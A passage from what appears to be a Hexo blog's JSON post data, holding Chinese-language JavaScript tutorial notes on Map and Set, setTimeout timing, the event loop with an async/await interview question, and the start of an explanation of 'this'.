class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var m = new Map(); // 空Map</span><br><span class=\"line\">m.set(&apos;Adam&apos;, 67); // 添加新的key-value</span><br><span class=\"line\">m.set(&apos;Bob&apos;, 59);</span><br><span class=\"line\">m.has(&apos;Adam&apos;); // 是否存在key &apos;Adam&apos;: true</span><br><span class=\"line\">m.get(&apos;Adam&apos;); // 67</span><br><span class=\"line\">m.delete(&apos;Adam&apos;); // 删除key &apos;Adam&apos;</span><br><span class=\"line\">m.get(&apos;Adam&apos;); // undefined</span><br></pre></td></tr></table></figure></p>\n<p>一个key只能对应一个value，所以，多次对一个key放入value，后面的值会把前面的值冲掉：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var m = new Map();</span><br><span class=\"line\">m.set(&apos;Adam&apos;, 67);</span><br><span class=\"line\">m.set(&apos;Adam&apos;, 88);</span><br><span class=\"line\">m.get(&apos;Adam&apos;); // 88</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"Set-没有重复的key\"><a href=\"#Set-没有重复的key\" class=\"headerlink\" title=\"Set(没有重复的key)\"></a>Set(<code>没有重复的key</code>)</h3><p><code>Set</code>和<code>Map</code>类似，也是一组<code>key的集合</code>，但<code>不存储value</code>。由于<code>key不能重复</code>，所以，在Set中，<code>没有重复的key</code>。<br>要<code>创建一个Set</code>，需要提供一个<code>Array</code>作为输入，或者<code>直接创建一个空Set</code>：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var s1 = new Set(); // 空Set</span><br><span class=\"line\">var s2 = new Set([1, 2, 3]); // 含1, 2, 3</span><br></pre></td></tr></table></figure></p>\n<p>重复元素在Set中自动被过滤：</p>\n<blockquote>\n<p>var s = new Set([1, 2, 3, 3, ‘3’]);<br>s; // Set {1, 2, 3, “3”}</p>\n</blockquote>\n<p>通过<code>add(key)</code>方法可以<code>添加元素到Set</code>中，可以重复添加，但不会有效果：<br>通过<code>delete(key)</code>方法可以删除元素：</p>\n"},{"title":"JS线程","date":"2018-05-09T06:32:36.000Z","_content":"## [转][从setTimeout/setInterval看JS线程](https://mp.weixin.qq.com/s/FCy68lhFhEcm8o26f7970A)\n`setTimeout`和`setInterval`的`延时最小间隔`是`4ms`(W3C在HTML标准中规定)；\n\n在`JavaScript`中`没有`任何代码是`立刻执行`的，但`一旦进程空闲`就`尽快执行`。\n\n这意味着无论是`setTimeout`还是`setInterval`，所设置的时间都只是 `n毫秒后被添加到队列中`，而`不是`过`n毫秒后立即执行`。\n\n---------------------\n[阅读原文](https://mp.weixin.qq.com/s/FCy68lhFhEcm8o26f7970A)","source":"_posts/FrontEnd/JS/JS线程.md","raw":"---\ntitle: JS线程\ndate: 2018-05-09 14:32:36\ntags:\ncategories:\n---\n## [转][从setTimeout/setInterval看JS线程](https://mp.weixin.qq.com/s/FCy68lhFhEcm8o26f7970A)\n`setTimeout`和`setInterval`的`延时最小间隔`是`4ms`(W3C在HTML标准中规定)；\n\n在`JavaScript`中`没有`任何代码是`立刻执行`的，但`一旦进程空闲`就`尽快执行`。\n\n这意味着无论是`setTimeout`还是`setInterval`，所设置的时间都只是 `n毫秒后被添加到队列中`，而`不是`过`n毫秒后立即执行`。\n\n---------------------\n[阅读原文](https://mp.weixin.qq.com/s/FCy68lhFhEcm8o26f7970A)","slug":"FrontEnd/JS/JS线程","published":1,"updated":"2018-05-09T06:34:33.043Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2cg006hb8xji5na01ej","content":"<h2 id=\"转-从setTimeout-setInterval看JS线程\"><a href=\"#转-从setTimeout-setInterval看JS线程\" class=\"headerlink\" title=\"[转]从setTimeout/setInterval看JS线程\"></a>[转]<a href=\"https://mp.weixin.qq.com/s/FCy68lhFhEcm8o26f7970A\" target=\"_blank\" rel=\"noopener\">从setTimeout/setInterval看JS线程</a></h2><p><code>setTimeout</code>和<code>setInterval</code>的<code>延时最小间隔</code>是<code>4ms</code>(W3C在HTML标准中规定)；</p>\n<p>在<code>JavaScript</code>中<code>没有</code>任何代码是<code>立刻执行</code>的，但<code>一旦进程空闲</code>就<code>尽快执行</code>。</p>\n<p>这意味着无论是<code>setTimeout</code>还是<code>setInterval</code>，所设置的时间都只是 <code>n毫秒后被添加到队列中</code>，而<code>不是</code>过<code>n毫秒后立即执行</code>。</p>\n<hr>\n<p><a href=\"https://mp.weixin.qq.com/s/FCy68lhFhEcm8o26f7970A\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"转-从setTimeout-setInterval看JS线程\"><a href=\"#转-从setTimeout-setInterval看JS线程\" class=\"headerlink\" title=\"[转]从setTimeout/setInterval看JS线程\"></a>[转]<a href=\"https://mp.weixin.qq.com/s/FCy68lhFhEcm8o26f7970A\" target=\"_blank\" rel=\"noopener\">从setTimeout/setInterval看JS线程</a></h2><p><code>setTimeout</code>和<code>setInterval</code>的<code>延时最小间隔</code>是<code>4ms</code>(W3C在HTML标准中规定)；</p>\n<p>在<code>JavaScript</code>中<code>没有</code>任何代码是<code>立刻执行</code>的，但<code>一旦进程空闲</code>就<code>尽快执行</code>。</p>\n<p>这意味着无论是<code>setTimeout</code>还是<code>setInterval</code>，所设置的时间都只是 <code>n毫秒后被添加到队列中</code>，而<code>不是</code>过<code>n毫秒后立即执行</code>。</p>\n<hr>\n<p><a href=\"https://mp.weixin.qq.com/s/FCy68lhFhEcm8o26f7970A\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n"},{"title":"JavaScript运行时","date":"2018-05-31T02:47:18.000Z","_content":"## Promise Async/await 运行时机制\n故事要从一道今日头条的笔试题说起～ \n\n题目来源：[半年工作经验今日头条和美团面试题面经分享！！！！！](https://juejin.im/post/5b03e79951882542891913e8)\n\n````\nasync function async1(){\n\n    console.log('async1 start')\n\n    await async2()\n\n    console.log('async1 end')\n\n}\n\nasync function async2(){\n\n    console.log('async2')\n\n}\n\nconsole.log('script start')\n\nsetTimeout(function(){\n\n    console.log('setTimeout') \n\n},0)  \n\nasync1();\n\nnew Promise(function(resolve){\n\n    console.log('promise1')\n\n    resolve();\n\n}).then(function(){\n\n    console.log('promise2')\n\n})\n\nconsole.log('script end')\n````\n求打印结果？\n\n题目考 js 事件循环和回调队列～ 假设看客已经了解 `setTimeout` 是`宏任务`会在`最后执行`的前提（因为它不是今天要讨论的重点），主要讨论 `promise`、`async` 和 `await` 之间的关系。\n\n个人思路：\n````\n1. console.log('script start')\n2. console.log('async1 start')\n   async2 开始执行\n   console.log('async1 end') 等待 async2\n3. \n4. \n\n````\n\n---\n\n## JS `执行机制` 及 `异步回调`( setTimeout / setInterval / Promise )\n\n`javascript执行机制` `代码执行顺序` `函数生命周期加载`等类似问题 都与`javascript执行机制`相关。\n\n1. 关于javascript\n`javascript`是一门`单线程语言`，在最新的`HTML5`中提出了`Web-Worker`，但`javascript是单线程这一核心仍未改变`。所以一切`javascript版的\"多线程\"都是用单线程模拟出来的`，一切javascript`多线程`都是`纸老虎`！\n2. javascript事件循环\n既然js是`单线程`，排队 办理业务, `js任务`也要一个一个顺序执行。如 `任务耗时过长`，后一个任务必须等着。浏览新闻 超清图片加载慢 需要异步加载 任务分为两类：\n+ 同步任务\n+ 异步任务\n  打开网站，`网页渲染` 过程 就是 `同步任务`，比如 `页面骨架`和 `页面元素`的`渲染`。而 `加载 图片 音乐`之类`占用资源大耗时久`的任务，就是`异步任务`。关于这部分有严格的文字定义，但本文的目的是用最小的学习成本彻底弄懂执行机制，所以我们用导图来说明：\n  ![js事件循环机制](https://img-blog.csdn.net/20171124105726497?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGFvYWlxaWFu/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)\n导图要表达的内容用文字来表述的话：<br>\n`同步`和`异步`任务分别进入不同的`执行”场所”`，`同步的进入主线程`，`异步的进入Event Table并注册函数`。当指定的事情`完成`时，`Event Table`会将这个`函数` `移入Event Queue`。`主线程`内的任务`执行完`毕为空，会去`Event Queue`读取对应的函数，进入主线程执行。\n\n上述过程会不断重复，也就是常说的Event Loop(事件循环)。\n\n我们不禁要问了，那`怎么知道`主线程执行栈为空啊？js引擎存在`monitoring process`进程，会`持续不断检查`主线程执行栈是否为空，`一旦为空`，就会去`Event Queue`那里检查是否有`等待被调用的函数`。 \n说了这么多文字，不如直接一段代码更直白：略\n\n3. 又爱又恨的setTimeout\n\n\n(https://juejin.im/post/59e85eebf265da430d571f89)\n\n(https://blog.csdn.net/haoaiqian/article/details/78622651)\n\n---\n\n## `Async/Await`替代 `Promise` 的6个理由\n\n\n[阅读原文](https://www.cnblogs.com/fundebug/p/6667725.html)\n","source":"_posts/FrontEnd/JS/Promise-Async-await-运行时机制.md","raw":"---\ntitle: JavaScript运行时\ndate: 2018-05-31 10:47:18\ntags: JS运行时\ncategories: JS RunTime\n---\n## Promise Async/await 运行时机制\n故事要从一道今日头条的笔试题说起～ \n\n题目来源：[半年工作经验今日头条和美团面试题面经分享！！！！！](https://juejin.im/post/5b03e79951882542891913e8)\n\n````\nasync function async1(){\n\n    console.log('async1 start')\n\n    await async2()\n\n    console.log('async1 end')\n\n}\n\nasync function async2(){\n\n    console.log('async2')\n\n}\n\nconsole.log('script start')\n\nsetTimeout(function(){\n\n    console.log('setTimeout') \n\n},0)  \n\nasync1();\n\nnew Promise(function(resolve){\n\n    console.log('promise1')\n\n    resolve();\n\n}).then(function(){\n\n    console.log('promise2')\n\n})\n\nconsole.log('script end')\n````\n求打印结果？\n\n题目考 js 事件循环和回调队列～ 假设看客已经了解 `setTimeout` 是`宏任务`会在`最后执行`的前提（因为它不是今天要讨论的重点），主要讨论 `promise`、`async` 和 `await` 之间的关系。\n\n个人思路：\n````\n1. console.log('script start')\n2. console.log('async1 start')\n   async2 开始执行\n   console.log('async1 end') 等待 async2\n3. \n4. \n\n````\n\n---\n\n## JS `执行机制` 及 `异步回调`( setTimeout / setInterval / Promise )\n\n`javascript执行机制` `代码执行顺序` `函数生命周期加载`等类似问题 都与`javascript执行机制`相关。\n\n1. 关于javascript\n`javascript`是一门`单线程语言`，在最新的`HTML5`中提出了`Web-Worker`，但`javascript是单线程这一核心仍未改变`。所以一切`javascript版的\"多线程\"都是用单线程模拟出来的`，一切javascript`多线程`都是`纸老虎`！\n2. javascript事件循环\n既然js是`单线程`，排队 办理业务, `js任务`也要一个一个顺序执行。如 `任务耗时过长`，后一个任务必须等着。浏览新闻 超清图片加载慢 需要异步加载 任务分为两类：\n+ 同步任务\n+ 异步任务\n  打开网站，`网页渲染` 过程 就是 `同步任务`，比如 `页面骨架`和 `页面元素`的`渲染`。而 `加载 图片 音乐`之类`占用资源大耗时久`的任务，就是`异步任务`。关于这部分有严格的文字定义，但本文的目的是用最小的学习成本彻底弄懂执行机制，所以我们用导图来说明：\n  ![js事件循环机制](https://img-blog.csdn.net/20171124105726497?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGFvYWlxaWFu/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)\n导图要表达的内容用文字来表述的话：<br>\n`同步`和`异步`任务分别进入不同的`执行”场所”`，`同步的进入主线程`，`异步的进入Event Table并注册函数`。当指定的事情`完成`时，`Event Table`会将这个`函数` `移入Event Queue`。`主线程`内的任务`执行完`毕为空，会去`Event Queue`读取对应的函数，进入主线程执行。\n\n上述过程会不断重复，也就是常说的Event Loop(事件循环)。\n\n我们不禁要问了，那`怎么知道`主线程执行栈为空啊？js引擎存在`monitoring process`进程，会`持续不断检查`主线程执行栈是否为空，`一旦为空`，就会去`Event Queue`那里检查是否有`等待被调用的函数`。 \n说了这么多文字，不如直接一段代码更直白：略\n\n3. 又爱又恨的setTimeout\n\n\n(https://juejin.im/post/59e85eebf265da430d571f89)\n\n(https://blog.csdn.net/haoaiqian/article/details/78622651)\n\n---\n\n## `Async/Await`替代 `Promise` 的6个理由\n\n\n[阅读原文](https://www.cnblogs.com/fundebug/p/6667725.html)\n","slug":"FrontEnd/JS/Promise-Async-await-运行时机制","published":1,"updated":"2018-06-22T01:08:12.306Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2ci006lb8xj4o2nzg48","content":"<h2 id=\"Promise-Async-await-运行时机制\"><a href=\"#Promise-Async-await-运行时机制\" class=\"headerlink\" title=\"Promise Async/await 运行时机制\"></a>Promise Async/await 运行时机制</h2><p>故事要从一道今日头条的笔试题说起～ </p>\n<p>题目来源：<a href=\"https://juejin.im/post/5b03e79951882542891913e8\" target=\"_blank\" rel=\"noopener\">半年工作经验今日头条和美团面试题面经分享！！！！！</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">async function async1()&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    console.log(&apos;async1 start&apos;)</span><br><span class=\"line\"></span><br><span class=\"line\">    await async2()</span><br><span class=\"line\"></span><br><span class=\"line\">    console.log(&apos;async1 end&apos;)</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">async function async2()&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    console.log(&apos;async2&apos;)</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">console.log(&apos;script start&apos;)</span><br><span class=\"line\"></span><br><span class=\"line\">setTimeout(function()&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    console.log(&apos;setTimeout&apos;) </span><br><span class=\"line\"></span><br><span class=\"line\">&#125;,0)  </span><br><span class=\"line\"></span><br><span class=\"line\">async1();</span><br><span class=\"line\"></span><br><span class=\"line\">new Promise(function(resolve)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    console.log(&apos;promise1&apos;)</span><br><span class=\"line\"></span><br><span class=\"line\">    resolve();</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;).then(function()&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    console.log(&apos;promise2&apos;)</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">console.log(&apos;script end&apos;)</span><br></pre></td></tr></table></figure>\n<p>求打印结果？</p>\n<p>题目考 js 事件循环和回调队列～ 假设看客已经了解 <code>setTimeout</code> 是<code>宏任务</code>会在<code>最后执行</code>的前提（因为它不是今天要讨论的重点），主要讨论 <code>promise</code>、<code>async</code> 和 <code>await</code> 之间的关系。</p>\n<p>个人思路：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. console.log(&apos;script start&apos;)</span><br><span class=\"line\">2. console.log(&apos;async1 start&apos;)</span><br><span class=\"line\">   async2 开始执行</span><br><span class=\"line\">   console.log(&apos;async1 end&apos;) 等待 async2</span><br><span class=\"line\">3. </span><br><span class=\"line\">4.</span><br></pre></td></tr></table></figure></p>\n<hr>\n<h2 id=\"JS-执行机制-及-异步回调-setTimeout-setInterval-Promise\"><a href=\"#JS-执行机制-及-异步回调-setTimeout-setInterval-Promise\" class=\"headerlink\" title=\"JS 执行机制 及 异步回调( setTimeout / setInterval / Promise )\"></a>JS <code>执行机制</code> 及 <code>异步回调</code>( setTimeout / setInterval / Promise )</h2><p><code>javascript执行机制</code> <code>代码执行顺序</code> <code>函数生命周期加载</code>等类似问题 都与<code>javascript执行机制</code>相关。</p>\n<ol>\n<li>关于javascript<br><code>javascript</code>是一门<code>单线程语言</code>，在最新的<code>HTML5</code>中提出了<code>Web-Worker</code>，但<code>javascript是单线程这一核心仍未改变</code>。所以一切<code>javascript版的&quot;多线程&quot;都是用单线程模拟出来的</code>，一切javascript<code>多线程</code>都是<code>纸老虎</code>！</li>\n<li>javascript事件循环<br>既然js是<code>单线程</code>，排队 办理业务, <code>js任务</code>也要一个一个顺序执行。如 <code>任务耗时过长</code>，后一个任务必须等着。浏览新闻 超清图片加载慢 需要异步加载 任务分为两类：</li>\n</ol>\n<ul>\n<li>同步任务</li>\n<li>异步任务<br>打开网站，<code>网页渲染</code> 过程 就是 <code>同步任务</code>，比如 <code>页面骨架</code>和 <code>页面元素</code>的<code>渲染</code>。而 <code>加载 图片 音乐</code>之类<code>占用资源大耗时久</code>的任务，就是<code>异步任务</code>。关于这部分有严格的文字定义，但本文的目的是用最小的学习成本彻底弄懂执行机制，所以我们用导图来说明：<br><img src=\"https://img-blog.csdn.net/20171124105726497?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGFvYWlxaWFu/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast\" alt=\"js事件循环机制\"><br>导图要表达的内容用文字来表述的话：<br><br><code>同步</code>和<code>异步</code>任务分别进入不同的<code>执行”场所”</code>，<code>同步的进入主线程</code>，<code>异步的进入Event Table并注册函数</code>。当指定的事情<code>完成</code>时，<code>Event Table</code>会将这个<code>函数</code> <code>移入Event Queue</code>。<code>主线程</code>内的任务<code>执行完</code>毕为空，会去<code>Event Queue</code>读取对应的函数，进入主线程执行。</li>\n</ul>\n<p>上述过程会不断重复，也就是常说的Event Loop(事件循环)。</p>\n<p>我们不禁要问了，那<code>怎么知道</code>主线程执行栈为空啊？js引擎存在<code>monitoring process</code>进程，会<code>持续不断检查</code>主线程执行栈是否为空，<code>一旦为空</code>，就会去<code>Event Queue</code>那里检查是否有<code>等待被调用的函数</code>。<br>说了这么多文字，不如直接一段代码更直白：略</p>\n<ol>\n<li>又爱又恨的setTimeout</li>\n</ol>\n<p>(<a href=\"https://juejin.im/post/59e85eebf265da430d571f89\" target=\"_blank\" rel=\"noopener\">https://juejin.im/post/59e85eebf265da430d571f89</a>)</p>\n<p>(<a href=\"https://blog.csdn.net/haoaiqian/article/details/78622651\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/haoaiqian/article/details/78622651</a>)</p>\n<hr>\n<h2 id=\"Async-Await替代-Promise-的6个理由\"><a href=\"#Async-Await替代-Promise-的6个理由\" class=\"headerlink\" title=\"Async/Await替代 Promise 的6个理由\"></a><code>Async/Await</code>替代 <code>Promise</code> 的6个理由</h2><p><a href=\"https://www.cnblogs.com/fundebug/p/6667725.html\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Promise-Async-await-运行时机制\"><a href=\"#Promise-Async-await-运行时机制\" class=\"headerlink\" title=\"Promise Async/await 运行时机制\"></a>Promise Async/await 运行时机制</h2><p>故事要从一道今日头条的笔试题说起～ </p>\n<p>题目来源：<a href=\"https://juejin.im/post/5b03e79951882542891913e8\" target=\"_blank\" rel=\"noopener\">半年工作经验今日头条和美团面试题面经分享！！！！！</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">async function async1()&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    console.log(&apos;async1 start&apos;)</span><br><span class=\"line\"></span><br><span class=\"line\">    await async2()</span><br><span class=\"line\"></span><br><span class=\"line\">    console.log(&apos;async1 end&apos;)</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">async function async2()&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    console.log(&apos;async2&apos;)</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">console.log(&apos;script start&apos;)</span><br><span class=\"line\"></span><br><span class=\"line\">setTimeout(function()&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    console.log(&apos;setTimeout&apos;) </span><br><span class=\"line\"></span><br><span class=\"line\">&#125;,0)  </span><br><span class=\"line\"></span><br><span class=\"line\">async1();</span><br><span class=\"line\"></span><br><span class=\"line\">new Promise(function(resolve)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    console.log(&apos;promise1&apos;)</span><br><span class=\"line\"></span><br><span class=\"line\">    resolve();</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;).then(function()&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    console.log(&apos;promise2&apos;)</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">console.log(&apos;script end&apos;)</span><br></pre></td></tr></table></figure>\n<p>求打印结果？</p>\n<p>题目考 js 事件循环和回调队列～ 假设看客已经了解 <code>setTimeout</code> 是<code>宏任务</code>会在<code>最后执行</code>的前提（因为它不是今天要讨论的重点），主要讨论 <code>promise</code>、<code>async</code> 和 <code>await</code> 之间的关系。</p>\n<p>个人思路：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. console.log(&apos;script start&apos;)</span><br><span class=\"line\">2. console.log(&apos;async1 start&apos;)</span><br><span class=\"line\">   async2 开始执行</span><br><span class=\"line\">   console.log(&apos;async1 end&apos;) 等待 async2</span><br><span class=\"line\">3. </span><br><span class=\"line\">4.</span><br></pre></td></tr></table></figure></p>\n<hr>\n<h2 id=\"JS-执行机制-及-异步回调-setTimeout-setInterval-Promise\"><a href=\"#JS-执行机制-及-异步回调-setTimeout-setInterval-Promise\" class=\"headerlink\" title=\"JS 执行机制 及 异步回调( setTimeout / setInterval / Promise )\"></a>JS <code>执行机制</code> 及 <code>异步回调</code>( setTimeout / setInterval / Promise )</h2><p><code>javascript执行机制</code> <code>代码执行顺序</code> <code>函数生命周期加载</code>等类似问题 都与<code>javascript执行机制</code>相关。</p>\n<ol>\n<li>关于javascript<br><code>javascript</code>是一门<code>单线程语言</code>，在最新的<code>HTML5</code>中提出了<code>Web-Worker</code>，但<code>javascript是单线程这一核心仍未改变</code>。所以一切<code>javascript版的&quot;多线程&quot;都是用单线程模拟出来的</code>，一切javascript<code>多线程</code>都是<code>纸老虎</code>！</li>\n<li>javascript事件循环<br>既然js是<code>单线程</code>，排队 办理业务, <code>js任务</code>也要一个一个顺序执行。如 <code>任务耗时过长</code>，后一个任务必须等着。浏览新闻 超清图片加载慢 需要异步加载 任务分为两类：</li>\n</ol>\n<ul>\n<li>同步任务</li>\n<li>异步任务<br>打开网站，<code>网页渲染</code> 过程 就是 <code>同步任务</code>，比如 <code>页面骨架</code>和 <code>页面元素</code>的<code>渲染</code>。而 <code>加载 图片 音乐</code>之类<code>占用资源大耗时久</code>的任务，就是<code>异步任务</code>。关于这部分有严格的文字定义，但本文的目的是用最小的学习成本彻底弄懂执行机制，所以我们用导图来说明：<br><img src=\"https://img-blog.csdn.net/20171124105726497?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGFvYWlxaWFu/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast\" alt=\"js事件循环机制\"><br>导图要表达的内容用文字来表述的话：<br><br><code>同步</code>和<code>异步</code>任务分别进入不同的<code>执行”场所”</code>，<code>同步的进入主线程</code>，<code>异步的进入Event Table并注册函数</code>。当指定的事情<code>完成</code>时，<code>Event Table</code>会将这个<code>函数</code> <code>移入Event Queue</code>。<code>主线程</code>内的任务<code>执行完</code>毕为空，会去<code>Event Queue</code>读取对应的函数，进入主线程执行。</li>\n</ul>\n<p>上述过程会不断重复，也就是常说的Event Loop(事件循环)。</p>\n<p>我们不禁要问了，那<code>怎么知道</code>主线程执行栈为空啊？js引擎存在<code>monitoring process</code>进程，会<code>持续不断检查</code>主线程执行栈是否为空，<code>一旦为空</code>，就会去<code>Event Queue</code>那里检查是否有<code>等待被调用的函数</code>。<br>说了这么多文字，不如直接一段代码更直白：略</p>\n<ol>\n<li>又爱又恨的setTimeout</li>\n</ol>\n<p>(<a href=\"https://juejin.im/post/59e85eebf265da430d571f89\" target=\"_blank\" rel=\"noopener\">https://juejin.im/post/59e85eebf265da430d571f89</a>)</p>\n<p>(<a href=\"https://blog.csdn.net/haoaiqian/article/details/78622651\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/haoaiqian/article/details/78622651</a>)</p>\n<hr>\n<h2 id=\"Async-Await替代-Promise-的6个理由\"><a href=\"#Async-Await替代-Promise-的6个理由\" class=\"headerlink\" title=\"Async/Await替代 Promise 的6个理由\"></a><code>Async/Await</code>替代 <code>Promise</code> 的6个理由</h2><p><a href=\"https://www.cnblogs.com/fundebug/p/6667725.html\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n"},{"title":"JavaScript`this`原理","date":"2018-06-22T07:20:13.000Z","_content":"# JavaScript 的 this 原理\n## 一、问题的由来\n学懂 JavaScript 语言，一个标志就是理解下面两种写法，可能有不一样的结果。\n\n````\nvar obj = {\n  foo: function () {}\n};\nvar foo = obj.foo;\n// 写法一\nobj.foo()\n// 写法二\nfoo()\n````\n上面代码中，虽然obj.foo和foo指向同一个函数，但是执行结果可能不一样。请看下面的例子。\n\n````\nvar obj = {\n  foo: function () { console.log(this.bar) },\n  bar: 1\n};\nvar foo = obj.foo;\nvar bar = 2;\nobj.foo() // 1\nfoo() // 2\n````\n\n这种差异的原因，就在于函数体内部使用了`this`关键字。很多教科书会告诉你，this指的是函数运行时所在的环境。\n对于obj.foo()来说，foo运行在obj环境，所以this指向obj；对于foo()来说，foo运行在全局环境，所以this指向全局环境。所以，两者的运行结果不一样。\n\n这种解释没错，但是教科书往往不告诉你，为什么会这样？也就是说，函数的运行环境到底是怎么决定的？举例来说，为什么obj.foo()就是在obj环境执行，而一旦var foo = obj.foo，foo()就变成在全局环境执行？\n\n本文就来解释 JavaScript 这样处理的原理。理解了这一点，你就会彻底理解this的作用。\n\n## 二、内存的数据结构\nJavaScript 语言之所以有`this`的设计，跟`内存`里面的`数据结构`有关系。\n\n````\nvar obj = { foo:  5 };\n````\n\n上面的代码将一个`对象`赋值给变量`obj`。JavaScript 引擎会先在`内存`里面，`生成一个对象{ foo: 5 }`，然后把这个对象的`内存地址`赋值给变量obj。\n\n也就是说，变量obj是一个地址 (reference) 。后面如果要读取obj.foo，引擎先从obj拿到内存地址，然后再从该地址读出原始的对象，返回它的foo属性。\n\n`原始的对象`以`字典结构`保存，每一个属性名都`对应`一个属性描述对象。举例来说，上面例子的foo属性，实际上是以下面的形式保存的。\n\n**注意**：foo属性的值保存在属性描述对象的value属性里面。\n\n## 三、函数\n这样的结构是很清晰的，问题在于属性的值可能是一个`函数`。\n\n````\nvar obj = { foo: function () {} };\n````\n这时，引擎会将函数单独保存在内存中，然后再将函数的地址赋值给foo属性的value属性。\n\n````\n{\n  foo: {\n    [[value]]: 函数的地址\n    ...\n  }\n}\n````\n\n由于函数是一个单独的值，所以它可以在不同的环境（上下文）执行。\n\n````\nvar f = function () {};\nvar obj = { f: f };\n// 单独执行\nf()\n// obj 